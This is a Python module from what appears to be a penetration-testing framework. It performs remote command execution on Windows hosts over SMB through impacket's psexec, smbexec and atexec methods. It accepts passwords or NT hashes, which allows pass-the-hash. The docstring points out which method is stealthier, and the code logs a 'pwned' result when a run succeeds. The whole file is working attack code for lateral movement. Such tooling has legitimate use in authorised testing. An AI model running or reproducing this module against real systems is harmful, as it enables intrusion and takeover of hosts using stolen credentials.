
# scripts/smb/attack/exec.py
"""
Remote command execution over SMB.
Three methods selectable via --method:
  psexec   — upload + run service binary (leaves artifacts, most reliable)
  smbexec  — execute via service without uploading binary (stealthier)
  atexec   — schedule task via Task Scheduler (no service creation)
Default: smbexec.
"""
from core.output import console, print_result
from core import session_db
from scripts.base import BaseScript

try:
    from impacket.smbconnection import SMBConnection
    from impacket.examples.smbclient import MiniImpacketShell
    _OK = True
except ImportError:
    _OK = False

try:
    from impacket.examples.psexec import PSEXEC
    _PSEXEC_OK = True
except ImportError:
    _PSEXEC_OK = False

try:
    from impacket.examples.smbexec import SMBEXEC
    _SMBEXEC_OK = True
except ImportError:
    _SMBEXEC_OK = False

try:
    from impacket.examples.atexec import TSCH_EXEC
    _ATEXEC_OK = True
except ImportError:
    _ATEXEC_OK = False


class Script(BaseScript):
    name        = "exec"
    protocol    = "smb"
    category    = "attack"
    description = (
        "Remote command execution via SMB. Methods: psexec, smbexec (default), atexec. "
        "Requires admin privileges."
    )

    def run(self, **kwargs):
        ip      = self.target.ip
        domain  = self.creds.domain   or ""
        user    = self.creds.user     or ""
        passwd  = self.creds.password or ""
        nt_hash = self.creds.hash     or ""
        timeout = self.target.timeout or 5
        command = kwargs.get("command", "whoami")
        method  = str(kwargs.get("method", "smbexec")).lower()

        lm_hash = ""
        if nt_hash and ":" in nt_hash:
            lm_hash, nt_hash = nt_hash.split(":", 1)

        console.print(f"\n[dim][exec] method={method} command={command} target={ip}[/dim]\n")

        output = None
        try:
            if method == "psexec":
                if not _PSEXEC_OK:
                    console.print("[red]impacket PSEXEC not available.[/red]"); return None
                executer = PSEXEC(command, None, None, None, int("0"), None,
                                  user, passwd, domain, lm_hash, nt_hash, None, ip)
                output = executer.run(ip)

            elif method == "atexec":
                if not _ATEXEC_OK:
                    console.print("[red]impacket ATEXEC not available.[/red]"); return None
                executer = TSCH_EXEC(user, passwd, domain, lm_hash, nt_hash, ip)
                output = executer.execute(command)

            else:  # smbexec (default)
                if not _SMBEXEC_OK:
                    console.print("[red]impacket SMBEXEC not available.[/red]"); return None
                executer = SMBEXEC(user, passwd, domain, lm_hash, nt_hash,
                                   "C:\\", None, None, ip, timeout=timeout)
                output = executer.execute(command)

        except Exception as e:
            print_result("SMB", ip, "fail", f"exec ({method}) failed: {e}"); return None

        if output:
            console.print(f"[bold green]Output:[/bold green]\n[cyan]{output}[/cyan]")
            print_result("SMB", ip, "pwned", f"exec ({method}) succeeded")
            session_db.DB.SaveFinding(ip, "SMB", "rce",
                                       f"method={method} cmd={command}")
        return output
